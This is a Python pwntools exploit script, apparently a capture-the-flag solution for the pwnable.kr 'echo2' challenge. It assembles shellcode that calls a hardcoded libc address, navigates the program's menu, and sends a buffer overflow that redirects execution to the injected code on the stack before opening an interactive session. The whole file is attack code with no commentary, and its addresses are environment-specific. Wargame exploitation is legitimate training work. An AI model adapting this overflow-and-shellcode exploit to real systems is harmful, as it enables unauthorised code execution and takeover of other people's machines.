from pwn import *
import sys

def main():
    context.arch = 'amd64'
    context.os = 'linux'

    if(sys.argv[1] == "remote"):
        print("Attacking Server!")
        p = remote("pwnable.kr",9011)
    else:
        print("Running Locally")
        p = process("./echo2")
        
    # Inputs setup
    ret2libc = """
    mov rax, 0x7ffff7f57e43
    mov rbx, 0x7ffff7df9c30
    mov rdi, [rax]
    call rbx
    """

    RBP = 0x7fffffffdaa0
    name = asm(ret2libc)
    target_addr = p64(RBP+0x20) # address of the name buffer
    payload = b"A" *24 + target_addr

    # Process interaction
    p.sendline(name)


    print("injected ret2libc: ")
    print(enhex(name))
    
    p.sendline(b"4")
    p.sendline(b"n")
    p.sendline(b"3")
    p.sendline(payload)
    p.interactive()
    # gdb.attach(p)

if __name__=="__main__":
    main()
